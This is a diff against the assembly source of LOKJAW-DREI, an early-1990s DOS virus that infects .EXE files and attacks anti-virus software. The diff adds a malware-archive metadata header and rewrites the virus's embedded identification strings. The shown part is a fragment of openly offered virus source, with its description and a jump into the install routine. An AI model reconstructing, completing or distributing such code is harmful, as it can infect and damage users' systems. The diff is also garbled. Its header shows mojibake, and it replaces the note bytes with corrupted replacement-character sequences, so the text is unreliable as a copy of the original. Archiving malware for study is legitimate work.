@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      L
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;LOKJAW-DREI: an .EXE-infecting spawning virus with retaliatory 
 ;anti-anti-virus capability.  For Crypt Newsletter 12, Feb. 1993.               
 ;
@@ -89,9 +100,9 @@ DTA             equ endit+8
 begin:          jmp     virus_install                              
 
 note:            
-		db     '[l™‡kõ„W-dâ].á.šrã$Å†d‰M–$'
-		db     'ÅH‹$.pâ™Gâ†m.Œ$.….{pâ™Å”-Å].ûƒâ‹†¤Å,$“âÅ.”Ÿ.'
-		db     '€â˜.¥‰w$Àä×îâ'  ;I.D. note: will doubtless
+		db     '[lï¿½ï¿½kï¿½ï¿½W-dâ].ï¿½.ï¿½rï¿½$Å†dï¿½Mï¿½$'
+		db     'ï¿½Hï¿½$.pï¿½Gï¿½m.ï¿½$.ï¿½.{pï¿½Å”-ï¿½].ï¿½ï¿½â‹†ï¿½ï¿½,$ï¿½ï¿½ï¿½.ï¿½ï¿½.'
+		db     'ï¿½â˜.ï¿½ï¿½w$ï¿½ï¿½ï¿½ï¿½ï¿½'  ;I.D. note: will doubtless
 					 ;show up in VSUM
 		
 
